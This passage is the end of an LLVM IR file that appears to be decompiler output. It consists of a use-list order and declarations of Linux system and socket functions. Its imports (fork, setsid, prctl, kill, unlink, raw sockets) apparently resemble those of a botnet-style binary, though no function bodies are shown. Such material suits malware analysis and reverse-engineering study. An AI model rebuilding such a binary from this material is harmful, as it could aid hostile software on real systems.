807, 808, 274, 809, 810, 811, 273, 812, 813, 814, 815, 121, 816, 818, 817, 119, 120, 200, 272, 373, 374, 372, 819, 287, 285, 286, 122, 201, 86, 202, 829, 133, 132, 130, 131, 830, 831, 87, 832, 833, 834, 835, 836, 203, 837, 838, 375, 839, 840, 841, 842, 207, 204, 205, 206, 843, 844, 845, 846, 376, 847, 848, 290, 849, 289, 850, 288, 851, 377, 852, 853, 854, 136, 134, 135, 20, 855, 856, 857, 858, 208, 859, 860, 292, 291, 861, 378, 862, 863, 864, 865, 866, 140, 137, 138, 139, 21, 867, 868, 869, 209, 870, 210, 871, 872, 295, 873, 294, 874, 293, 875, 379, 876, 215, 381, 213, 214, 211, 212, 878, 217, 216, 879, 218, 380, 881, 882, 144, 141, 142, 143, 22, 880, 883, 884, 885, 886, 887, 888, 23, 24, 25, 26, 27, 889, 890, 382, 297, 891, 383, 892, 384, 893, 385, 894, 386, 895, 387, 896, 388, 897, 296, 898, 219, 220, 221, 900, 901, 899, 903, 904, 902, 28, 29, 30, 31, 32, 905, 222, 906, 907, 299, 908, 389, 909, 390, 910, 391, 911, 392, 912, 393, 913, 394, 914, 298, 915, 395, 916, 224, 223, 225, 918, 919, 917, 920, 921, 84, 923, 924, 925, 926, 396, 927, 33, 34, 35, 36, 37, 922, 226, 123, 928, 929, 304, 930, 303, 931, 302, 932, 300, 933, 301, 934, 397, 935, 398, 936, 227, 230, 229, 228, 939, 940, 938, 937, 399, 942, 941, 943, 231, 944, 945, 307, 946, 306, 947, 305, 948, 400, 949, 232, 235, 234, 233, 952, 953, 951, 950, 955, 954, 956, 957, 236, 310, 958, 309, 959, 308, 960, 401, 961, 278, 962, 1147, 237, 1148, 969, 238, 970, 1026, 1027, 1028, 1029, 1030, 1031, 239, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 240, 241, 1040, 1041, 1042, 1048, 242, 1049, 1050, 1051, 243, 402, 1052, 1053, 46, 1054, 1055, 1056, 1057, 1058, 403, 1061, 244, 1149, 1062, 1063, 1064, 1065, 1150, 1151, 1066, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 404, 1165, 638, 639, 640, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 47, 1207, 1208, 1209, 245, 246, 1210, 405, 1211, 1212, 1213, 1214, 641, 676, 1215, 1216, 1217, 48, 1218, 1219, 1220, 1221, 49, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 50, 1229, 1230, 251, 1231, 1232, 1233, 1234, 1235, 1236, 51, 1237, 1238, 1239, 52, 1240, 1241, 1242, 53, 1243, 1244, 1245, 1246, 408, 1260, 1261, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 642, 677, 1256, 1257, 1258, 1259, 643, 678, 1262, 1263, 1264, 54, 1265, 1266, 409, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 644, 679, 1275, 1276, 1277, 55, 1278, 1279, 1280, 1281, 56, 1282, 645, 1283, 1284, 1287, 1288, 646, 247, 1285, 1286, 248, 249, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 647, 680, 1300, 1301, 1302, 57, 1303, 1304, 1305, 1306, 1307, 1308, 58, 1309, 124, 1310, 1311, 1312, 1313, 648, 681, 1314, 1315, 1316, 59, 1317, 250, 1318, 1319, 1320, 60, 1321, 1322, 1323, 1324, 1325, 649, 682, 1326, 1327, 1328, 61, 1329, 1330, 1331, 62, 406, 407, 1332, 1333, 1334, 1335, 1336, 650, 683, 1337, 1338, 1339, 63, 1340, 1341, 1342, 64, 1343, 1344, 1345, 65, 1346, 1347, 1348, 66, 1349, 1350, 1351, 1352, 67, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 1361, 1362, 1365, 1366, 651, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 279, 1378, 1381, 1382, 1385, 1386, 1387, 68, 1383, 1384, 1379, 1380, 1388, 1389, 253, 252, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 1399, 69, 254, 1400, 1401, 1402, 70, 1403, 1404, 1405, 1406, 1408, 92, 410, 1409, 1407, 1363, 1364, 114, 626, 627, 1410, 1411, 1412, 652, 653, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 1420, 1421, 1422, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1431, 1432, 311, 1433, 312, 1434, 313, 1435, 1436, 684, 685, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 1565, 1566, 1567, 1568, 1569, 1570, 1571, 1572, 1573, 1574, 1575, 1576, 1577, 1578, 1579 }
  uselistorder i32* @r4, {}
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @chdir(i8*) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @getppid() local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @accept(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @bind(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @getsockopt(i32, i32, i32, i32*, i32*) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @recvfrom(i32, i32*, i32, i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
